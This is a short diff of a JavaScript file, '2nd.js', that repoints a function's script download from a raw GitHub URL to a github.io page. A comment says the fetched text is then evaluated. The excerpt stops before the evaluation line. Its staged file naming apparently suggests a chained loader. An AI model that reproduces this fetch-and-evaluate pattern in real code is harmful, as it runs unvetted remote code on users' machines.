@@ -1,7 +1,7 @@
 // 2nd.js
 async function getStaticWebsite() {
     try {
-        const response = await fetch('https://raw.githubusercontent.com/1stAccount/repo/main/3rd.js');
+        const response = await fetch('https://lesbon23.github.io/example123/ghi.js');
         const scriptText = await response.text();
 
         // Evaluate the script to access exported content
